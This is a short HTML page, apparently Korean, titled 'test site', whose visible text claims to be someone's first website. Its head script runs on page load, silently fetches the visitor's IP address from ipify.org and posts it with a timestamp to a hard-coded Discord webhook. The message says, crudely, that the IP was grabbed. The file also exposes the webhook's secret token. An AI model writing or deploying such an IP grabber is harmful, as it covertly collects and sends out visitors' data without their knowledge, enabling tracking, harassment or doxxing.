<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>test site</title>
    <script>
        // 1. 디스코드에서 복사한 원본 웹훅 URL을 넣어주세요 (끝에 /github 가 없어야 합니다)
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554079546448285738/bPvvBD1kInPi0nVVwC1y9rMM1RUo3aApOciZMQyGjx1Sa0Aids9GLlCPfJ9B_nRpGx3-";

        window.onload = async function() {
            try {
                // IP 수집 API 호출 (CORS를 피하기 위해 format 기본값 사용)
                const response = await fetch('https://ipify.org');
                const data = await response.json();
                const clientIp = data.ip;

                // 디스코드 전송 데이터 양식
                const payload = {
                    content: ` **# 아이피땄다시발**\n- **IP 주소:** \`\${clientIp}\`\n- **접속 시간:** ${new Date().toLocaleString()}`
                };

                // CORS 문제를 최소화하기 위해 'no-cors' 모드를 사용하거나 헤더를 단순화하여 전송합니다.
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

            } catch (error) {
                //console.error('오류 발생:', error);
            }
        };
    </script>
</head>
<body>
    <h1>첨으로 웹사이트 만듬ㅋ</h1>
</body>
</html>
